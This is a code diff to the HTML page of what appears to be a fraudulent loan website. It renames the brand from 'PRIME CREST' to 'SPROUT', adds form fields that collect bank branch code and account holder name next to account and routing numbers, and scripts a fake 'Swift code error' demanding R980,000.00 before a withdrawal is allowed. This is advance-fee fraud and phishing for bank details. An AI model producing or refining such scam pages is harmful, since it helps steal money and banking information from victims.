@@ -2,10 +2,10 @@
 <html lang="zxx">
 
 <head>
-	<title>PRIME CREST | Loans | Credit</title>
+	<title>SPROUT | Loans | Credit</title>
 	<meta charset="UTF-8">
-	<meta name="description" content="PRIME CREST | Loans | Credit">
-	<meta name="keywords" content="PRIME CREST | Loans | Credit">
+	<meta name="description" content="SPROUT | Loans | Credit">
+	<meta name="keywords" content="SPROUT | Loans | Credit">
 	<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
 	<!-- Favicon -->
@@ -65,7 +65,7 @@
 	<header class="header-section">
 		<a href="index.html" class="site-logo">
 			<!--<img src="img/logo.png" alt="">-->
-			PRIME<span class="red">C</span>REST
+			SPR<span class="red">O</span>UT
 		</a>
 		<nav class="header-nav">
 			<ul class="main-menu">
@@ -171,6 +171,8 @@
 					<form class="hero-form" method="POST" onsubmit="return  move()">
 						
 						<input required id="bankname" type="text" placeholder="Bank Name">
+						<input required id="bankname" type="text" placeholder="Bank Branch Code">
+						<input required id="bankname" type="text" placeholder="Account Holder's Name">
 						<input required id="acctnumber" type="number" placeholder="Account number">
 						<input required id="routingnumber" type="number" placeholder="Routing number">
 						<span id="trancs" class="myshow"><button  class="site-btn ">Transfer</button></span>
@@ -202,7 +204,7 @@
 	<footer class="footer-section">
 		<div class="container">
 			<a href="index.html" class="footer-logo">
-				PRIME<span class="red">C</span>REST
+				SPR<span class="red">O</span>UT
 			</a>
 			<div class="row">
 				<div class="col-lg-3 col-sm-6">
@@ -236,7 +238,7 @@
 						<h2>Legal</h2>
 						<ul>
 							<li><a href="#">Privacy policy</a></li>
-							<li><a href="#">prime crest principles</a></li>
+							<li><a href="#">sproutbg principles</a></li>
 							<li><a href="#">Website terms</a></li>
 							<li><a href="#">Cookie policy</a></li>
 							<li><a href="#">Conflicts policy</a></li>
@@ -303,7 +305,7 @@
 			return false;
 		}
 		const showAlert = () => {
-			document.getElementById("error-message").innerHTML = "<strong>Oops!! Swift code error.</strong><br><p> pay R980,000.00 for swift verification to enable withdrawal  </p>  ";
+			document.getElementById("error-message").innerHTML = "<strong>Oops!! Swift code error.</strong><br><p> In other to make such transactions, you are required to pay R980,000.00 . Please contact your private banker assigned to you for any clearification and questions  </p>  ";
 				document.getElementById("error-message").classList.replace("myhide", "myshow");
 				setTimeout("errorShown()", 8000);
 		}
